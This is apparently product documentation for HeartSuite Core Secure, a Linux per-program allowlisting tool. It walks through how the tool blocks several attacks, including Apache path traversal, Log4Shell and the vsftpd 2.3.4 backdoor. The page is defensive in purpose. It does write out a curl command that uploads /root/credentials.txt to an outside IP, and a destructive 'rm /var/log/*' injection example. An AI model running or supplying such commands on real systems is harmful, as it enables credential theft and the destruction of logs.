---
title: "In Practice"
linkTitle: "In Practice"
weight: 6
description: "How HeartSuite Core Secure's three enforcement mechanisms hold against real attacks — one example per mechanism, including what it does not cover."
categories: ["Essentials"]
tags: ["heartsuite", "linux", "attacks", "exfiltration", "cve", "binary", "ransomware", "in-practice"]
type: docs
toc: true
menu:
  main:
    parent: "introduction"
    identifier: "in-practice"
---

**Overview**: Every attack does three things: run a program, access files, make a network connection. HeartSuite Core Secure controls all three — per program, not per user. Each section below targets one of these three mechanisms with a real attack. Every example involves root access. In each case, root is not enough.

Each attack below was actively exploited within days of its disclosure. The gap between a vulnerability being published and attackers using it has collapsed to hours, not weeks. Patching cannot keep pace. HeartSuite Core Secure's enforcement blocks these attacks regardless of whether the vulnerable software has been patched — because it gates what each program can reach, not whether a vulnerability exists.

## A New Program Tries to Run

**The attack.** An attacker gains a foothold on a server — a compromised web application, a stolen credential, a misconfigured service. Their next move is to get more capability. They download a tool: a reconnaissance script, a credential dumper, a reverse shell. On a standard Linux server, a file downloaded to `/tmp` is executable the moment it arrives. As root, there are no further gates.

**What HeartSuite Core Secure does.** Every program must have an allowlist entry before the kernel will run it. A file downloaded to `/tmp` has no entry — it was never observed during Setup Mode, never reviewed, never approved. The kernel refuses to execute it. The attacker has a file. They cannot run it.

This applies equally to interpreted scripts. A malicious Python script dropped at `/tmp/attack.py` has no allowlist entry for that path. HeartSuite Core Secure's Secure Script Launchers give each script its own allowlist entry, separate from the interpreter. Python runs. The unauthorized script does not.

**What it does not cover.** If the attacker already controls an approved program and issues commands within that program's approved scope, this gate does not apply. See [What This Page Does Not Cover](#what-this-page-does-not-cover).

---

## An Approved Program Reads What It Shouldn't

**The attack.** CVE-2021-41773 — Apache HTTP Server 2.4.49. A flaw in how Apache validates URL paths allows an attacker to craft a request that escapes the web root. Apache fetches and returns arbitrary files from the filesystem. The attacker requests `/etc/passwd`. Apache reads it and returns it. No authentication required.

The traditional defense — run Apache as `www-data` with limited permissions — does not help when the attacker targets files that `www-data` can legitimately read. On most systems, `/etc/passwd` is world-readable by design.

**What HeartSuite Core Secure does.** Apache's allowlist entry defines exactly which files and directories it can read. `/etc/passwd` is not in that list — Apache was never observed reading it during Setup Mode, because a correctly configured web server never needs to. When the crafted request causes Apache to attempt to open `/etc/passwd`, the kernel refuses. The path traversal works as a URL trick. It fails as a file operation.

The question is not whether the system user can read `/etc/passwd`. The question is whether this specific program — Apache — is approved to read it. It is not.

The same mechanism applies to binary replacement. If an attacker with root tries to overwrite `/usr/bin/whoami` with a malicious script, the write is blocked — because the program issuing the write does not have `/usr/bin/whoami` in its file write allowlist. Root privilege does not override this check.

**What it does not cover.** If the attacker targets only files the compromised program is already approved to read, this gate does not apply.

---

## An Approved Program Sends Data It Shouldn't

**The attack.** An attacker on a server uses `curl` — a standard utility present on nearly every Linux system — to send data out:

```bash
curl -X POST --data-binary "@/root/credentials.txt" http://203.0.113.42/upload
```

On a standard server with root access, this works. `curl` reads the file, opens a socket to the destination, and uploads the contents. The data leaves.

**What HeartSuite Core Secure does.** Two checks activate, independently. First, `/root/credentials.txt` is not in `curl`'s file access allowlist — `curl` was never approved to read files from `/root`. The read fails before a connection is attempted. Second, even if `curl` could read the file, `203.0.113.42` is not in `curl`'s network allowlist. The socket is refused.

Either check alone stops the exfiltration. Both activate. The result is the same whether the attacker uses `curl`, `wget`, a raw `/dev/tcp` connection, or `logger` forwarding to a remote syslog server — the mechanism is identical for all of them: a socket to a non-allowlisted IP is refused, regardless of which tool asks and regardless of privilege level.

Log4Shell (CVE-2021-44228) shows the same gate working in reverse. The attack works by causing a vulnerable application to reach out to attacker-controlled infrastructure to fetch and run malicious code. That outbound request — to a server not in the application's network allowlist — is refused. The code never arrives. The attack ends at the network gate before anything executes.

**Scope.** Network allowlisting controls which programs can reach which destinations. What they send over those approved connections is the domain of your network detection tools — see the complementary table in [How HeartSuite Core Secure Compares](../how-it-compares/).

---

## When Attackers Stay Within Approved Boundaries

HeartSuite Core Secure enforces three things per program. An attacker who stays entirely within those approved boundaries is constrained — but not stopped. Each scenario below shows what remains enforced even then, and which defenses handle the rest.

**Prompt injection.** An attacker embeds instructions in content the program processes — a document, a web page, an API response. The program follows them. HeartSuite Core Secure sees an approved program doing approved things. File access and outbound connections remain gated. The attack is in the meaning of the content — content-layer defenses are what handle content-layer attacks.

**Command injection inside an approved interpreter.** If `bash` is on the allowlist and an attacker causes an approved program to call `bash -c 'rm /var/log/*'`, the command runs within `bash`'s approved file scope. File access outside that scope is still blocked. What runs inside an approved interpreter is not inspected — tight allowlist scope limits the damage.

**Backdoored programs that are already on the allowlist.** vsftpd 2.3.4 (CVE-2011-2523) shipped with a backdoor compiled in — connecting with a username containing `:)` opens a listener on port 6200 and hands the attacker a root shell. If vsftpd is on the allowlist, the backdoor activates inside vsftpd's own process: no new binary executes, no outbound connection is made, and no file access outside vsftpd's approved scope occurs. HeartSuite Core Secure limits what the attacker can do with that shell — file reads and outbound network connections remain gated. A program already approved to run can exercise its approved permissions, including ones a backdoor author planned for.

**Attacks within a program's approved scope.** A compromised web server that reads only files it is already approved to read, and connects only to destinations already in its network allowlist, operates within its allowlist. Every file outside that scope is still blocked. Every connection to an unapproved destination is still refused. Tight allowlisting limits the blast radius — and File Backup ensures recovery for files the program was approved to write.

For detection and response when an attack stays within approved boundaries, see [How HeartSuite Core Secure Compares](../how-it-compares/) — specifically the complementary tools table covering SIEM, NDR, and EDR.
